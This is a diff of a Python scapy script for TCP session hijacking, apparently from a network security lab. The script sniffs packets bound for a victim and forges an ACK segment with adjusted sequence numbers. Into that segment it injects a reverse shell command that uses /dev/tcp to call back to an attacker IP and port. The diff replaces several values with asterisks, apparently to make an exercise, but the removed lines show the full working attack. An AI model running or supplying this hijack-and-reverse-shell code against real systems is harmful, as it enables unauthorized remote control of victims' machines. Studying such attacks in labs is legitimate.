@@ -9,24 +9,24 @@ IFACE = subprocess.run(cmd, shell=True, check=True,
                        universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
 
 attacker_ip = "10.9.0.1"
-attacker_port = 9090
-victim_ip = "10.9.0.5"
+attacker_port = ****
+victim_ip = ****
 
-REVERSE_SHELL = f"\r/bin/bash -i > /dev/tcp/{attacker_ip}/{attacker_port} 0<&1 2>&1\r"
+REVERSE_SHELL = f"\r/bin/bash -i > /dev/tcp/{****}/{****} 0<&1 2>&1\r"
 
 def automatic_hijacking():
     print("*** Hijacking Automatic Mode ***")
     print('[+] Sniffing...')
-    sniff(iface=IFACE, filter='tcp', prn=_hijacking)
+    sniff(iface=IFACE, filter=****, prn=_hijacking)
 
 
 def _hijacking(pkt):
-    if pkt[IP].dst == victim_ip and Raw in pkt:
+    if pkt[IP].**** == victim_ip and Raw in pkt:
         tcp_seg_len = len(pkt.getlayer(Raw).load)
 
-        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
-        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A",
-                  seq=pkt[TCP].seq+tcp_seg_len, ack=pkt[TCP].ack+tcp_seg_len)
+        ip = IP(src=pkt[IP].****, dst=pkt[IP].****)
+        tcp = TCP(sport=pkt[TCP].****, dport=pkt[TCP].****, flags="A",
+                  seq=pkt[TCP].****+tcp_seg_len, ack=pkt[TCP].****+tcp_seg_len)
         data = REVERSE_SHELL 
         pkt = ip/tcp/data
         send(pkt, iface=IFACE, verbose=0)
